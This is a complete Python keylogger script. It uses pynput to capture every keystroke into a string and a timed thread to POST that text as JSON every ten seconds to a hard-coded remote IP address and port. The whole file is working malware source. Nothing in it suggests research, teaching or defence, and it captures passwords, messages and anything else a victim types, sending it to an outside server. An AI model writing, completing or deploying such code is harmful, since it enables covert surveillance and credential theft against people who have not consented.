from email.mime import application

from pynput import keyboard

import requests

import json

import threading

# This is a Global variable text where I'll save a string of keystrokes which I'll send to the server.
text = ""

ip_address = "83.111.102.51"
port_number = "54000"

# time interval of 10

time_interval = 10

def send_post_req():
    try:
        # converting the python object into a JSON string.
        payload = json.dumps({"keyboardData" : text})
        # specifying that the mime type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        #this timer will run every <time_interval> specified seconds.
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

# we only need to log the key once it released.
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
      text += "\t"
    elif key == keyboard.Key.space:
      text += " "
    elif key == keyboard.Key.shift:
      pass
    elif key == keyboard.Key.backspace and len(text) == 0:
      pass
    elif key == keyboard.Key.backspace and len(text) > 0:
      text= text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
      pass
    elif key == keyboard.Key.esc:
      return False
    else:
      text += str(key).strip("'")


with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()